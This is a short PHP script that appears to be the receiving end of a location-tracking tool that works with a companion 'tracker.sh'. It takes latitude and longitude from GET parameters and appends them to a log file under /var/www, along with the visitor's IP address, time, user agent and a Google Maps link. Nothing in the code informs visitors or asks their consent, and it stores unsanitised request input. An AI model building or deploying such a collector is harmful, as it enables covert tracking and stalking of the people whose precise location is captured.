<?php
$dir = '/var/www/logs.txt'; // change this to the directory where you like the logsfile to be, but do not forget to change the var $logsfile at tracker.sh too
if (isset($_GET["lat"]) && isset($_GET["lon"])){
    $infos = "REQUEST FROM " . $_SERVER["REMOTE_ADDR"] . " at " . date("H:i:s") . "\nLatitude: " . $_GET["lat"] . "\nLongitude: " . $_GET["lon"] . 
    "\nGoogle Maps: https://www.google.com/maps/search/?api=1&query=" . $_GET["lat"] . "," . $_GET["lon"] . "\nUser Agent: '" . $_SERVER['HTTP_USER_AGENT'] . "'\n\n";
    if (!file_exists($dir))
        fopen($dir, "w"); // generate file if it does not alredy exist
    file_put_contents($dir, file_get_contents($dir) . "*****************************\n\n" . $infos, false);
    
}

?>